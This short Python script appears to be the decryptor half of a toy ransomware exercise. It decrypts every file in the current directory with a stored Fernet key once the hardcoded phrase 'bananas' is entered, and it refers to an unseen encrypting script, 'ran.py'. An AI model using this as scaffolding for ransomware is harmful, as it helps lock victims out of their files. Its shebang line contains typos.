#!/urs/bin/env pyhton

import os
from cryptography.fernet import Fernet

#File find


files = []

for file  in os.listdir():
	if file == "ran.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)

with open("thekey.key", "rb") as key:
	secretkey = key.read()

secretphrase = "bananas"

user_phrase = input("Enter the phrase to decrpyt your files\n")

if user_phrase == secretphrase:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted =  Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
			print("good your free from the frogs tongue")
else:
			print("Frog still has hold")

